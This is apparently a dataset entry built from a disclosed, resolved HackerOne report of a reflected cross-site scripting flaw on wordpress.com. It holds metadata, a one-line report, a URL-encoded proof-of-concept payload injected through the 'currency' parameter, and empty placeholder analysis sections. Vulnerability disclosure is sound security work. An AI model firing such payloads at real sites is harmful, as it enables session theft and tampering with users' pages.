---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '133963'
original_report_id: '133963'
title: XSS on www.wordpress.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: automattic
created_at: '2016-04-23T03:56:17.804Z'
disclosed_at: '2016-04-28T06:56:22.598Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS on www.wordpress.com

## Metadata

- HackerOne Report ID: 133963
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: automattic
- Disclosed At: 2016-04-28T06:56:22.598Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey,

I found an XSS vulnerability on www.wordpress.com

Here's a proof-of-concept working in the latest version of Firefox - https://wordpress.com/website/?currency=%3C/title%3E%3C/script/%22-alert%280%29-%22--%3E%22%3E%3Csvg/onload=prompt%28document.domain%29%3E

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
